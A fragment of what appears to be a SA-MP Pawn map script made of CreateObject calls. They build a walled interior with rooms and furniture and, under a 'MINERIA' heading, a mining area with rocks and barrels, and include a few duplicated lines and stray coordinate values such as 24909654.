	CreateObject(9339, 2481.66235, 1264.58142, 865.69012,   0.00000, 0.00000, 0.00000);
	CreateObject(9339, 2593.40552, 1254.06348, 865.69012,   0.00000, 0.00000, -90.00006);
	CreateObject(9339, 2567.30859, 1254.06348, 865.71008,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2541.24585, 1254.06348, 865.69012,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2515.14551, 1254.06348, 865.69012,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 24909654.00000, 1254.06348, 865.69012,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2489.08545, 1254.06348, 865.69012,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2489.08545, 1254.06348, 867.09009,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2489.08545, 1254.06348, 868.49011,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2515.11743, 1254.05896, 867.09009,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2515.14551, 1254.06348, 868.49011,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2541.24585, 1254.06348, 867.07013,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2541.26587, 1254.06348, 868.47009,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2567.33569, 1254.06348, 867.11011,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2567.34546, 1254.06348, 868.49011,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2489.08545, 1254.06348, 867.09009,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2489.08545, 1254.06348, 867.09009,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2593.40552, 1254.06348, 867.05011,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2593.42407, 1254.06348, 868.45007,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2606.27539, 1264.66956, 867.09009,   0.00000, 0.00000, 0.00000);
	CreateObject(9339, 2606.27539, 1264.66956, 868.45007,   0.00000, 0.00000, 0.00000);
	CreateObject(9339, 2606.27539, 1290.72949, 867.09009,   0.00000, 0.00000, 0.00000);
	CreateObject(9339, 2606.27539, 1290.72949, 868.45007,   0.00000, 0.00000, 0.00000);
	CreateObject(9339, 2606.27539, 1316.82947, 867.07013,   0.00000, 0.00000, 0.00000);
	CreateObject(9339, 2606.27539, 1316.82947, 868.45007,   0.00000, 0.00000, 0.00000);
	CreateObject(9339, 2593.34033, 1329.71021, 867.09009,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2593.34033, 1329.71021, 868.45007,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2567.22583, 1329.72021, 867.11011,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2567.23877, 1329.72021, 868.43011,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2545.72095, 867.09009, 867.09009,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2541.17407, 1329.72021, 868.43011,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2515.09521, 1329.73376, 867.07013,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2515.10547, 1329.73376, 868.43011,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2541.19629, 1329.72021, 867.11011,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2489.01514, 1329.73376, 867.09009,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2488.99658, 1329.73376, 868.43011,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2481.65503, 1316.71509, 867.07013,   0.00000, 0.00000, 0.00000);
	CreateObject(9339, 2481.65503, 1316.71509, 868.47009,   0.00000, 0.00000, 0.00000);
	CreateObject(9339, 2481.65503, 1290.62280, 867.09009,   0.00000, 0.00000, 0.00000);
	CreateObject(9339, 2481.65503, 1290.62280, 868.47009,   0.00000, 0.00000, 0.00000);
	CreateObject(9339, 2481.66235, 1264.58142, 867.07013,   0.00000, 0.00000, 0.00000);
	CreateObject(9339, 2481.64233, 1264.57971, 868.47009,   0.00000, 0.00000, 0.00000);
	CreateObject(10768, 2469.82568, 1324.14551, 882.38959,   0.00000, -180.00000, 48.48000);
	CreateObject(1557, 2606.13965, 1327.57581, 865.34833,   0.00000, 0.00000, -91.02000);
	CreateObject(1557, 2606.13794, 1324.57678, 865.34833,   0.00000, 0.00000, -269.22009);
	CreateObject(19453, 2601.42041, 1315.28174, 867.01178,   0.00000, 0.00000, -89.94000);
	CreateObject(19453, 2591.80029, 1315.28174, 867.01178,   0.00000, 0.00000, -89.94000);
	CreateObject(19453, 2582.15723, 1315.30151, 867.01178,   0.00000, 0.00000, -89.94000);
	CreateObject(19453, 2591.74170, 1302.62842, 867.01178,   0.00000, 0.00000, -89.94000);
	CreateObject(19453, 2577.19360, 1320.01892, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(1491, 2577.10840, 1324.79773, 865.37317,   0.00000, 0.00000, 94.32001);
	CreateObject(1491, 2576.86011, 1327.79272, 865.37317,   0.00000, 0.00000, -86.21999);
	CreateObject(19453, 2576.68848, 1332.55334, 867.03180,   0.00000, 0.00000, -177.48000);
	CreateObject(19453, 2576.96851, 1325.39355, 869.61182,   0.00000, 0.00000, -177.60001);
	CreateObject(19453, 2576.68848, 1332.55334, 867.03180,   0.00000, 0.00000, -177.48000);
	CreateObject(19453, 2576.68848, 1332.55334, 867.03180,   0.00000, 0.00000, -177.48000);
	CreateObject(1622, 2577.25708, 1328.65112, 868.59052,   0.00000, 0.00000, 152.15990);
	CreateObject(2261, 2577.69189, 1322.57214, 867.79889,   0.00000, 0.00000, 92.40000);
	CreateObject(1702, 2592.38525, 1315.87976, 865.37329,   0.00000, 0.00000, -180.17999);
	CreateObject(1702, 2594.86523, 1315.87976, 865.37329,   0.00000, 0.00000, -180.17999);
	CreateObject(1702, 2597.44531, 1315.87976, 865.37329,   0.00000, 0.00000, -180.17999);
	CreateObject(1702, 2600.14526, 1315.87976, 865.37329,   0.00000, 0.00000, -180.17999);
	CreateObject(1702, 2603.00537, 1315.87976, 865.37329,   0.00000, 0.00000, -180.17999);
	CreateObject(1702, 2589.50488, 1315.87671, 865.37329,   0.00000, 0.00000, -180.17999);
	CreateObject(1702, 2586.60498, 1315.87671, 865.37329,   0.00000, 0.00000, -180.17999);
	CreateObject(2002, 2581.70654, 1315.85376, 865.35211,   0.00000, 0.00000, -180.00000);
	CreateObject(2202, 2591.59985, 1329.12842, 865.37469,   0.00000, 0.00000, -360.36020);
	CreateObject(1998, 2594.85986, 1327.31531, 865.37384,   0.00000, 0.00000, -180.18001);
	CreateObject(1663, 2593.96289, 1327.44421, 865.79749,   0.00000, 0.00000, 0.00000);
	CreateObject(2196, 2593.40503, 1326.96521, 866.18396,   0.00000, 0.00000, 61.49996);
	CreateObject(2007, 2590.30957, 1329.10425, 865.27399,   0.00000, 0.00000, 0.00000);
	CreateObject(19376, 2588.82959, 1325.69714, 861.07440,   0.00000, 0.00000, -89.10000);
	CreateObject(3851, 2589.76904, 1325.65027, 868.41321,   0.00000, 0.00000, 90.60000);
	CreateObject(19376, 2590.57935, 1325.72351, 861.07440,   0.00000, 0.00000, -89.10000);
	CreateObject(19376, 2590.60962, 1325.69714, 872.61438,   0.00000, 0.00000, -89.10000);
	CreateObject(1491, 2584.08081, 1329.65454, 865.37323,   0.00000, 0.00000, -91.74000);
	CreateObject(19376, 2588.82959, 1325.69714, 872.61438,   0.00000, 0.00000, -89.10000);
	CreateObject(19433, 2584.08398, 1326.34448, 867.00720,   0.00000, 0.00000, 0.00000);
	CreateObject(19433, 2584.08398, 1327.40454, 867.00720,   0.00000, 0.00000, 0.00000);
	CreateObject(19433, 2584.08398, 1328.98462, 869.62720,   0.00000, 0.00000, 0.00000);
	CreateObject(19433, 2595.34399, 1326.48450, 867.00720,   0.00000, 0.00000, 0.00000);
	CreateObject(19433, 2595.34399, 1328.06445, 867.00720,   0.00000, 0.00000, 0.00000);
	CreateObject(19433, 2595.34399, 1329.64453, 867.00720,   0.00000, 0.00000, 0.00000);
	CreateObject(19453, 2566.39111, 1324.96240, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(19453, 2566.75122, 1316.56226, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(1491, 2566.90747, 1311.02356, 865.35327,   0.00000, 0.00000, -89.34000);
	CreateObject(19453, 2561.89307, 1316.85168, 867.01178,   0.00000, 0.00000, -269.99960);
	CreateObject(19390, 2566.95239, 1310.22754, 867.00531,   0.00000, 0.00000, 0.00000);
	CreateObject(19453, 2562.22070, 1308.69714, 867.01178,   0.00000, 0.00000, -269.99960);
	CreateObject(19453, 2557.21533, 1312.86389, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(19453, 2567.15015, 1304.07117, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(19390, 2567.34277, 1297.90784, 867.00531,   0.00000, 0.00000, 0.00000);
	CreateObject(19453, 2562.60449, 1296.38049, 867.01178,   0.00000, 0.00000, -269.99960);
	CreateObject(1491, 2567.30835, 1298.68835, 865.35327,   0.00000, 0.00000, -89.94000);
	CreateObject(19453, 2557.62378, 1303.38745, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(19453, 2558.03979, 1293.92932, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(19453, 2567.49536, 1292.23962, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(19390, 2567.69800, 1285.90430, 867.00531,   0.00000, 0.00000, 0.00000);
	CreateObject(1491, 2567.65356, 1286.68713, 865.35327,   0.00000, 0.00000, -89.94000);
	CreateObject(19453, 2562.96460, 1284.38049, 867.01178,   0.00000, 0.00000, -269.99960);
	CreateObject(19453, 2558.25220, 1289.12158, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(19453, 2567.90552, 1279.63965, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(19390, 2568.11987, 1273.22498, 867.00531,   0.00000, 0.00000, 0.00000);
	CreateObject(1491, 2568.13330, 1274.01025, 865.35327,   0.00000, 0.00000, -89.94000);
	CreateObject(19453, 2563.38770, 1271.70276, 867.01178,   0.00000, 0.00000, -269.99960);
	CreateObject(19453, 2558.49316, 1279.94324, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(19453, 2558.64624, 1276.53674, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(19390, 2577.40234, 1313.65686, 867.00531,   0.00000, 0.00000, 0.00000);
	CreateObject(19453, 2577.62061, 1307.35901, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(1491, 2577.41333, 1314.41675, 865.35327,   0.00000, 0.00000, -89.46000);
	CreateObject(19453, 2582.55542, 1302.62671, 867.01178,   0.00000, 0.00000, -89.94000);
	CreateObject(19453, 2600.97534, 1302.62903, 867.01178,   0.00000, 0.00000, -89.94000);
	CreateObject(19453, 2610.36353, 1302.61108, 867.01178,   0.00000, 0.00000, -89.94000);
	CreateObject(19453, 2588.71704, 1310.48315, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(19453, 2588.85474, 1307.41504, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(19390, 2577.80981, 1301.27563, 867.00531,   0.00000, 0.00000, 0.00000);
	CreateObject(19453, 2578.01416, 1295.01355, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(19453, 2582.99146, 1290.28284, 867.01178,   0.00000, 0.00000, -89.94000);
	CreateObject(19453, 2589.20508, 1297.88354, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(19453, 2589.60693, 1288.39246, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(19453, 2592.39722, 1290.28357, 867.01178,   0.00000, 0.00000, -89.94000);
	CreateObject(1491, 2577.81689, 1302.05762, 865.35327,   0.00000, 0.00000, -89.94000);
	CreateObject(19390, 2578.23706, 1288.85925, 867.00531,   0.00000, 0.00000, 0.00000);
	CreateObject(19453, 2578.43604, 1282.60205, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(19453, 2583.41797, 1277.89050, 867.01178,   0.00000, 0.00000, -89.94000);
	CreateObject(19453, 2592.42236, 1277.87439, 867.01178,   0.00000, 0.00000, -89.94000);
	CreateObject(19453, 2590.01147, 1279.12000, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(1491, 2578.26489, 1289.64355, 865.35327,   0.00000, 0.00000, -89.94000);
	CreateObject(19390, 2578.66650, 1276.54797, 867.00531,   0.00000, 0.00000, 0.00000);
	CreateObject(19453, 2578.86890, 1270.20569, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(19453, 2583.80420, 1265.46838, 867.01178,   0.00000, 0.00000, -89.94000);
	CreateObject(19453, 2593.30005, 1265.47986, 867.01178,   0.00000, 0.00000, -89.94000);
	CreateObject(19453, 2590.41821, 1270.21863, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(1491, 2578.68042, 1277.34534, 865.35327,   0.00000, 0.00000, -89.94000);
	CreateObject(19453, 2579.26685, 1260.62415, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(19453, 2579.65649, 1251.42615, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(19453, 2568.81299, 1258.78101, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(19361, 2570.11450, 1263.49377, 867.01880,   0.00000, 0.00000, -93.00000);
	CreateObject(19361, 2573.28589, 1263.31787, 867.01880,   0.00000, 0.00000, -93.00000);
	CreateObject(1491, 2577.86816, 1263.11328, 865.35327,   0.00000, 0.00000, -183.12000);
	CreateObject(1491, 2574.89014, 1263.23718, 865.35327,   0.00000, 0.00000, -362.76031);
	CreateObject(19361, 2579.38525, 1263.07214, 867.01880,   0.00000, 0.00000, -93.00000);
	CreateObject(19361, 2576.40332, 1263.14722, 869.48212,   0.00000, 0.00000, -93.00000);
	CreateObject(19453, 2553.93774, 1271.70447, 867.01178,   0.00000, 0.00000, -269.99960);
	CreateObject(19390, 2567.14526, 1263.69373, 867.00531,   0.00000, 0.00000, 85.67998);
	CreateObject(19390, 2564.02808, 1263.92798, 867.00531,   0.00000, 0.00000, 85.67998);
	CreateObject(19453, 2565.80688, 1259.06360, 867.01178,   0.00000, 0.00000, -177.48000);
	CreateObject(1491, 2566.35522, 1263.74963, 865.33331,   0.00000, 0.00000, -364.14029);
	CreateObject(1491, 2563.23828, 1263.93347, 865.33331,   0.00000, 0.00000, -364.14029);
	CreateObject(19453, 2562.73730, 1259.29907, 867.03180,   0.00000, 0.00000, -177.48000);
	CreateObject(19390, 2560.94189, 1264.18091, 867.00531,   0.00000, 0.00000, 85.68000);
	CreateObject(19453, 2559.61060, 1259.56372, 867.03180,   0.00000, 0.00000, -177.48000);
	CreateObject(19361, 2561.19141, 1258.79675, 867.01880,   0.00000, 0.00000, -93.00000);
	CreateObject(1491, 2560.15381, 1264.23425, 865.33331,   0.00000, 0.00000, -364.14029);
	CreateObject(19453, 2554.60010, 1264.40613, 867.01178,   0.00000, 0.00000, -271.31949);
	CreateObject(19390, 2548.31299, 1264.63574, 867.00531,   0.00000, 0.00000, 85.68000);
	CreateObject(19453, 2547.00806, 1259.88025, 867.03180,   0.00000, 0.00000, -177.48000);
	CreateObject(19453, 2547.39990, 1250.78943, 867.03180,   0.00000, 0.00000, -177.48000);
	CreateObject(19453, 2560.01880, 1250.50598, 867.03180,   0.00000, 0.00000, -177.48000);
	CreateObject(19453, 2544.61792, 1271.70129, 867.01178,   0.00000, 0.00000, -269.99960);
	CreateObject(19453, 2541.98242, 1264.74756, 867.01178,   0.00000, 0.00000, -269.99960);
	CreateObject(19453, 2535.60693, 1271.68127, 867.01178,   0.00000, 0.00000, -269.99960);
	CreateObject(19453, 2535.60693, 1271.68127, 867.01178,   0.00000, 0.00000, -269.99960);
	CreateObject(19453, 2532.91650, 1264.75244, 867.01178,   0.00000, 0.00000, -269.99960);
	CreateObject(19453, 2542.86450, 1263.67944, 867.01178,   0.00000, 0.00000, -362.15952);
	CreateObject(19390, 2543.13403, 1270.03320, 867.00531,   0.00000, 0.00000, -3.36001);
	CreateObject(19453, 2533.22168, 1269.06555, 867.01178,   0.00000, 0.00000, -362.15952);
	CreateObject(2700, 2566.67749, 1313.64661, 867.97443,   0.00000, 0.00000, -179.88000);
	CreateObject(1796, 2560.83716, 1310.61389, 865.37372,   0.00000, 0.00000, 91.62000);
	CreateObject(1796, 2560.71704, 1314.59387, 865.37372,   0.00000, 0.00000, 91.62000);
	CreateObject(14867, 2563.05103, 1308.16052, 866.87927,   0.00000, 0.00000, 179.70000);
	CreateObject(1796, 2561.06470, 1305.34973, 865.37372,   0.00000, 0.00000, 91.62000);
	CreateObject(1796, 2561.32129, 1299.67822, 865.37372,   0.00000, 0.00000, 91.62000);
	CreateObject(14867, 2562.78931, 1316.39392, 866.87927,   0.00000, 0.00000, 179.70000);
	CreateObject(2700, 2566.87085, 1303.07800, 867.97443,   0.00000, 0.00000, -179.88000);
	CreateObject(1796, 2561.59424, 1293.99988, 865.37372,   0.00000, 0.00000, 91.62000);
	CreateObject(1796, 2561.87158, 1287.95984, 865.37372,   0.00000, 0.00000, 91.61999);
	CreateObject(14867, 2563.35986, 1295.95105, 866.87927,   0.00000, 0.00000, 179.70000);
	CreateObject(2700, 2567.25366, 1290.69788, 867.97443,   0.00000, 0.00000, -179.88000);
	CreateObject(1796, 2562.07202, 1281.09119, 865.37372,   0.00000, 0.00000, 91.62000);
	CreateObject(1796, 2562.23120, 1275.65723, 865.37372,   0.00000, 0.00000, 91.62000);
	CreateObject(14867, 2563.72681, 1283.83716, 866.87927,   0.00000, 0.00000, 179.70000);
	CreateObject(2700, 2567.62720, 1279.75635, 867.97443,   0.00000, 0.00000, -179.88000);
	CreateObject(14867, 2583.17773, 1302.67285, 866.87927,   0.00000, 0.00000, 360.23978);
	CreateObject(1796, 2585.15625, 1311.19238, 865.37372,   0.00000, 0.00000, -89.70000);
	CreateObject(1796, 2585.34155, 1306.15491, 865.37372,   0.00000, 0.00000, -89.70000);
	CreateObject(2700, 2577.72388, 1309.81738, 867.89441,   0.00000, 0.00000, 0.84000);
	CreateObject(14867, 2584.16333, 1290.84204, 866.87927,   0.00000, 0.00000, 360.23981);
	CreateObject(1796, 2585.86011, 1293.32690, 865.37372,   0.00000, 0.00000, -89.70000);
	CreateObject(1796, 2585.62573, 1298.58105, 865.37372,   0.00000, 0.00000, -89.70000);
	CreateObject(2700, 2578.35620, 1295.00671, 867.89441,   0.00000, 0.00000, 2.04000);
	CreateObject(14867, 2585.01538, 1278.33679, 866.87927,   0.00000, 0.00000, 360.23981);
	CreateObject(1796, 2586.31592, 1281.76697, 865.37372,   0.00000, 0.00000, -89.70000);
	CreateObject(1796, 2586.09692, 1287.49158, 865.37372,   0.00000, 0.00000, -89.70000);
	CreateObject(2700, 2578.77051, 1282.36206, 867.89441,   0.00000, 0.00000, 2.04000);
	CreateObject(14867, 2584.83862, 1265.96448, 866.87927,   0.00000, 0.00000, 360.23981);
	CreateObject(1796, 2586.93066, 1269.00024, 865.37372,   0.00000, 0.00000, -89.16000);
	CreateObject(1796, 2586.68896, 1273.83923, 865.37372,   0.00000, 0.00000, -89.16000);
	CreateObject(2700, 2579.13916, 1271.00281, 867.89441,   0.00000, 0.00000, 2.04000);
	CreateObject(3386, 2569.11597, 1261.65906, 865.32941,   0.00000, 0.00000, 1.62000);
	CreateObject(3392, 2569.41724, 1259.27734, 865.35089,   0.00000, 0.00000, 185.51990);
	CreateObject(3386, 2569.07129, 1262.65845, 865.32941,   0.00000, 0.00000, 1.62000);
	CreateObject(3383, 262.71094, 1882.25000, -31.39844,   356.85840, 0.00000, -1.57080);
	CreateObject(3383, 2573.43164, 1258.63123, 865.31482,   0.04000, 0.00000, 90.84002);
	CreateObject(3396, 2569.63599, 1255.92175, 865.33392,   -0.02000, 0.00000, -179.03990);
	CreateObject(2361, 2578.80371, 1257.28674, 865.35480,   0.00000, 0.00000, 91.50000);
	CreateObject(2361, 2578.76367, 1258.94666, 865.35480,   0.00000, 0.00000, 91.50000);
	CreateObject(2525, 2567.03882, 1260.06628, 865.36829,   0.00000, 0.00000, -180.23990);
	CreateObject(2518, 2568.09448, 1261.87573, 865.77222,   0.00000, 0.00000, -89.46000);
	CreateObject(19361, 2564.23657, 1259.79358, 867.01880,   0.00000, 0.00000, -93.00000);
	CreateObject(19361, 2567.06860, 1259.51550, 867.01880,   0.00000, 0.00000, -93.00000);
	CreateObject(2525, 2564.04858, 1260.34924, 865.36829,   0.00000, 0.00000, -180.23990);
	CreateObject(2518, 2565.09009, 1262.04614, 865.75220,   0.00000, 0.00000, -89.46000);
	CreateObject(1789, 2560.80640, 1259.20728, 865.91052,   0.00000, 0.00000, 0.00000);
	CreateObject(1778, 2560.01563, 1261.12415, 865.37518,   0.00000, 0.00000, -85.14001);
	CreateObject(2713, 2559.70801, 1262.88220, 865.49573,   0.00000, 0.00000, -89.58000);
	CreateObject(1208, 2562.31738, 1260.61047, 865.37494,   0.00000, 0.00000, 90.35999);
	CreateObject(1208, 2562.31372, 1261.27954, 865.37488,   0.00000, 0.00000, 90.36000);
	CreateObject(1208, 2562.31372, 1259.95947, 865.37488,   0.00000, 0.00000, 90.36000);
	CreateObject(1208, 2562.31372, 1261.93945, 865.37488,   0.00000, 0.00000, 90.36000);
	CreateObject(2380, 2559.36621, 1261.84192, 866.19342,   0.00000, 0.00000, -87.66000);
	CreateObject(2380, 2559.36621, 1261.84192, 867.77338,   0.00000, 0.00000, -87.66000);
	CreateObject(2380, 2559.36621, 1258.46191, 866.19342,   0.00000, 0.00000, -87.66000);
	CreateObject(2380, 2559.36621, 1258.46191, 867.75342,   0.00000, 0.00000, -87.66000);
	CreateObject(2286, 2555.17480, 1254.22986, 867.47839,   0.00000, 0.00000, -180.24020);
	CreateObject(2117, 2552.13745, 1258.89368, 865.37457,   0.00000, 0.00000, 0.00000);
	CreateObject(2074, 2553.17993, 1259.13562, 868.47931,   0.00000, 0.00000, 0.00000);
	CreateObject(14867, 2547.34546, 1260.69373, 866.85962,   0.00000, 0.00000, -86.58000);
	CreateObject(14867, 2547.72290, 1253.04517, 866.85962,   0.00000, 0.00000, -86.58000);
	CreateObject(2117, 2552.13745, 1259.85376, 865.37457,   0.00000, 0.00000, 0.00000);
	CreateObject(2117, 2554.09741, 1259.85376, 865.37457,   0.00000, 0.00000, 0.00000);
	CreateObject(2117, 2554.09741, 1258.89368, 865.37457,   0.00000, 0.00000, 0.00000);
	CreateObject(1721, 2552.29639, 1261.35522, 865.37427,   0.00000, 0.00000, -179.10020);
	CreateObject(1721, 2553.91284, 1261.39673, 865.37433,   0.00000, 0.00000, -179.10020);
	CreateObject(1721, 2555.13281, 1261.41675, 865.37433,   0.00000, 0.00000, -179.10020);
	CreateObject(1721, 2555.05127, 1257.19958, 865.37433,   0.00000, 0.00000, -359.10001);
	CreateObject(1721, 2553.74634, 1257.15356, 865.37433,   0.00000, 0.00000, -359.10001);
	CreateObject(1721, 2552.22681, 1257.11121, 865.37433,   0.00000, 0.00000, -359.10001);
	CreateObject(1663, 2535.51001, 1268.08838, 865.81097,   0.00000, 0.00000, 87.12000);
	CreateObject(2008, 2536.66479, 1268.99072, 865.37427,   0.00000, 0.00000, -91.25999);
	CreateObject(1734, 2536.70361, 1268.58508, 868.77240,   0.00000, 0.00000, 0.00000);
	CreateObject(2007, 2533.86646, 1271.12866, 865.31512,   0.00000, 0.00000, 86.76000);
	CreateObject(2007, 2533.80640, 1270.16870, 865.31512,   0.00000, 0.00000, 86.76000);
	CreateObject(2007, 2533.76660, 1269.20874, 865.31512,   0.00000, 0.00000, 86.76000);
	CreateObject(2164, 2533.25439, 1267.45203, 865.33459,   0.00000, 0.00000, 87.90000);
	CreateObject(2164, 2533.18774, 1265.69812, 865.33459,   0.00000, 0.00000, 87.90000);
	CreateObject(2262, 2542.38501, 1267.07422, 867.13538,   0.00000, 0.00000, -92.10000);
	CreateObject(2261, 2542.35327, 1265.79016, 867.04688,   0.00000, 0.00000, -92.82000);
	CreateObject(2002, 2542.59180, 1265.18835, 865.37390,   0.00000, 0.00000, -182.63991);
	CreateObject(2007, 2533.80640, 1270.16870, 866.69513,   0.00000, 0.00000, 86.76000);
	CreateObject(2007, 2533.86646, 1271.12866, 866.69513,   0.00000, 0.00000, 86.76000);
	CreateObject(2007, 2533.74805, 1269.20105, 866.69513,   0.00000, 0.00000, 86.76000);
	CreateObject(1702, 2538.61182, 1271.15186, 865.37421,   0.00000, 0.00000, 0.00000);
	CreateObject(2239, 2536.82642, 1267.16333, 865.33411,   0.00000, 0.00000, 0.00000);

	//          MINERIA         //
	CreateObject(13675, 38.72421, -1695.08228, 800.40631,   0.00000, 0.00000, 0.00000);
	CreateObject(13675, -23.83010, -1572.05896, 800.40631,   0.00000, 0.00000, 45.59999);
	CreateObject(13675, -137.45171, -1517.40466, 800.40631,   0.00000, 0.00000, 73.19999);
	CreateObject(13675, -228.98851, -1545.34668, 800.40631,   0.00000, 0.00000, 111.11992);
	CreateObject(13675, -330.88275, -1586.70190, 800.40631,   0.00000, 0.00000, 140.63989);
	CreateObject(13675, -107.97237, -1785.43225, 800.72632,   0.00000, 0.00000, -169.80009);
	CreateObject(13675, -168.88026, -1735.71191, 802.32629,   0.00000, 0.00000, -64.56000);
	CreateObject(4020, -50.31731, -1831.92651, 762.90295,   0.00000, 0.00000, 0.00000);
	CreateObject(4020, -62.81237, -1751.48621, 729.88135,   0.00000, 180.00000, 359.00000);
	CreateObject(4020, -88.90334, -1637.89124, 762.90295,   0.00000, 0.00000, 0.00000);
	CreateObject(4020, -86.05817, -1541.46191, 762.90295,   0.00000, 0.00000, 0.00000);
	CreateObject(4020, -273.22391, -1598.25330, 762.90295,   0.00000, 0.00000, 0.00000);
	CreateObject(4020, -292.11383, -1656.85925, 762.90295,   0.00000, 0.00000, 0.00000);
	CreateObject(4020, -364.39639, -1703.86658, 762.90295,   0.00000, 0.00000, 0.00000);
	CreateObject(13675, -104.32078, -1834.00574, 800.72632,   0.00000, 0.00000, -87.24009);
	CreateObject(4020, -25.72769, -1719.82043, 762.90302,   0.00000, 0.00000, -360.00000);
	CreateObject(4020, -53.86490, -1668.22693, 729.89581,   0.00000, 180.00000, 359.00000);
	CreateObject(4020, -27.99490, -1577.67664, 729.90723,   0.00000, 180.00000, 359.00000);
	CreateObject(4020, -189.69630, -1557.02856, 729.91742,   0.00000, 180.00000, 359.00000);
	CreateObject(4020, -234.72290, -1638.53186, 748.33398,   0.00000, 180.00000, 359.00000);
	CreateObject(4020, -336.93256, -1676.69604, 748.33398,   0.00000, 180.00000, 359.00000);
	CreateObject(13675, -194.89282, -1666.58801, 802.32629,   0.00000, 0.00000, -149.22008);
	CreateObject(16304, -15.44362, -1747.56616, 743.00043,   0.00000, 0.00000, 0.00000);
	CreateObject(1508, -41.30688, -1785.92578, 744.60999,   0.00000, 0.00000, -89.40000);
	CreateObject(1215, -74.97430, -1767.90210, 743.53271,   0.00000, 0.00000, 0.00000);
	CreateObject(1215, -76.22976, -1764.98120, 743.53271,   0.00000, 0.00000, 0.00000);
	CreateObject(1215, -77.54890, -1760.09033, 743.53271,   0.00000, 0.00000, 0.00000);
	CreateObject(1215, -80.19475, -1754.52502, 743.53271,   0.00000, 0.00000, 0.00000);
	CreateObject(1215, -82.64898, -1749.34802, 743.53271,   0.00000, 0.00000, 0.00000);
	CreateObject(1215, -83.80196, -1745.10327, 743.53271,   0.00000, 0.00000, 0.00000);
	CreateObject(1215, -84.90636, -1739.95923, 743.53271,   0.00000, 0.00000, 0.00000);
	CreateObject(1215, -85.65501, -1735.51904, 743.53271,   0.00000, 0.00000, 0.00000);
	CreateObject(1215, -85.81023, -1729.73645, 743.53271,   0.00000, 0.00000, 0.00000);
	CreateObject(1215, -85.67202, -1724.57288, 743.53271,   0.00000, 0.00000, 0.00000);
	CreateObject(1215, -84.82640, -1719.02734, 743.53271,   0.00000, 0.00000, 0.00000);
	CreateObject(1215, -85.66856, -1712.11877, 743.53271,   0.00000, 0.00000, 0.00000);
	CreateObject(1215, -85.54327, -1705.20227, 743.53271,   0.00000, 0.00000, 0.00000);
	CreateObject(1215, -84.12414, -1698.12061, 743.53271,   0.00000, 0.00000, 0.00000);
	CreateObject(1215, -84.62482, -1692.38477, 743.53271,   0.00000, 0.00000, 0.00000);
	CreateObject(1215, -85.10758, -1688.12012, 743.53271,   0.00000, 0.00000, 0.00000);
	CreateObject(1215, -85.98846, -1682.46436, 743.53271,   0.00000, 0.00000, 0.00000);
	CreateObject(1215, -87.02965, -1678.37610, 743.53271,   0.00000, 0.00000, 0.00000);
	CreateObject(1215, -86.07346, -1672.27100, 743.53271,   0.00000, 0.00000, 0.00000);
	CreateObject(1215, -83.37793, -1666.56299, 743.53271,   0.00000, 0.00000, 0.00000);
	CreateObject(1215, -80.18055, -1659.66992, 743.53271,   0.00000, 0.00000, 0.00000);
	CreateObject(3461, -44.74261, -1785.81116, 744.58679,   0.00000, 0.00000, 0.00000);
	CreateObject(3461, -37.79049, -1785.72119, 744.58679,   0.00000, 0.00000, 0.00000);
	CreateObject(899, -59.25952, -1781.00537, 743.00000,   0.00000, 0.00000, -27.00001);
	CreateObject(899, -25.62954, -1779.22168, 743.00000,   0.00000, 0.00000, -332.27957);
	CreateObject(899, -26.88462, -1768.16858, 743.00000,   0.00000, 0.00000, -332.27957);
	CreateObject(899, -28.36500, -1755.49744, 743.00000,   0.00000, 0.00000, -332.27957);
	CreateObject(899, -29.59880, -1741.84717, 743.00000,   0.00000, 0.00000, -332.27957);
	CreateObject(899, -58.80568, -1772.96216, 743.00000,   0.00000, 0.00000, -27.00001);
